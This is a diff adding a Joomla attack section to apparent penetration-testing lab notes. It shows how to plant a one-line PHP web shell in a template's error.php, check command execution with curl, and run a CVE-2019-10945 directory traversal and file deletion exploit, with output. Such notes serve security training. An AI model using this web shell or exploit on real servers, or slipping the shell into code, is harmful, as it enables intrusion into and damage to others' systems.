@@ -13,6 +13,10 @@
   - [Joomla - Discovery \& Enum](#joomla---discovery--enum)
     - [Disovery/Footprinting](#disoveryfootprinting)
     - [Enumeration](#enumeration-1)
+  - [Joomla - Attack](#joomla---attack)
+    - [Abusing Built-In Functionality](#abusing-built-in-functionality)
+    - [Leveraging Known Vulnerabilities](#leveraging-known-vulnerabilities)
+      - [CVE-2019-10945](#cve-2019-10945)
 
 ---
 
@@ -687,4 +691,81 @@ admin:admin
 ```
 
 And yout get a hit with the credentials ```admin```:```admin```. Someone has not been following best practices.
+
+## Joomla - Attack
+
+### Abusing Built-In Functionality
+
+During the Joomla enumeration phase and the general research hunting for company data, you may come across leaked credentials that you can use for your purpose. Once logged in, you can see many options available to you. For your purpose, you would like to add a snippet of PHP code to gain RCE. You can to this by customizing a template.
+
+![attacking cms 4](../../../images/attacking_cms4.png)
+
+From here, you can click on "Templates" on the bottom left under "Configuration" to pull up the templates menu.
+
+Next, you can click on a template name. This will bring you to the "Template: Customise" page.
+
+Finally, you can click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for your web shells to not make them easily accessible to a "drive-by" attacker during the assessment. You can also password protect and even limit access down to your source IP address. Also, you must always remember to clean up web shells as soon as you are done with them but still include the file name, file hash, and location in your final report to the client.
+
+Choosing the error.php page:
+
+```php
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+```
+
+Once this is in, click on "Save & Close" at the top and confirm code execution using cURL.
+
+```bash
+d41y@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### Leveraging Known Vulnerabilities
+
+#### CVE-2019-10945
+
+CVE-2019-10945 is a directory traversal and authenticated file deletion vulnerability. You can use [this](https://www.exploit-db.com/exploits/46710) exploit script to leverage the vuln and list the contents of the webroot and other dirs. The python3 version of this same script can be found [here](https://github.com/dpgg101/CVE-2019-10945). You can also use it to delete files. This could lead to access to sensitive files such as config files or scripts holding creds if you can then access it via the application URL. An attacker could also cause damage by deleting necessary files if the webserver user has proper permissions.
+
+You run the script by specifying the ```--url```, ```--username```, ```--password```, and ```--dir``` flags. As pentesters, this would only be useful to you if the admin portal is not accessible from the outside since, armed with admin creds, you can gain RCE.
+
+```bash
+d41y@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
+ 
+# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
+# Web Site: Haboob.sa
+# Email: research@haboob.sa
+# Versions: Joomla 1.5.0 through Joomla 3.9.4
+# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
+ _    _          ____   ____   ____  ____  
+| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
+| |__| |  /  \  | |_) | |  | | |  | | |_) |
+|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
+| |  | |/ ____ \| |_) | |__| | |__| | |_) |
+|_|  |_/_/    \_\____/ \____/ \____/|____/ 
+                                                                       
+
+
+administrator
+bin
+cache
+cli
+components
+images
+includes
+language
+layouts
+libraries
+media
+modules
+plugins
+templates
+tmp
+LICENSE.txt
+README.txt
+configuration.php
+htaccess.txt
+index.php
+robots.txt
+web.config.txt
+```
 
